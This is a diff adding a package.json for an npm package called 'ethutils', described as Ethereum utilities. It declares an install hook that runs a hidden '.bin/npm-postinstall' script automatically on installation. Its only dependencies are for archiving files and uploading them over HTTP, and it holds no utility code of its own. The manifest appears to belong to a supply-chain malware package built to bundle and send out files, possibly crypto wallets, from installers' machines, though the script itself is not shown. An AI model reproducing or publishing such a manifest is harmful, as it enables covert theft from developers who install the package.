@@ -1,0 +1,25 @@
+{
+  "name": "ethutils",
+  "version": "1.0.5",
+  "description": "ethereum utils",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "install": "node .bin/npm-postinstall"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/ethutils/ethutils"
+  },
+  "keywords": [
+    "ethereum",
+    "utils"
+  ],
+  "author": "ethutils",
+  "license": "ISC",
+  "dependencies": {
+    "archiver": "^5.3.0",
+    "axios": "^0.26.1",
+    "form-data": "^4.0.0"
+  }
+}
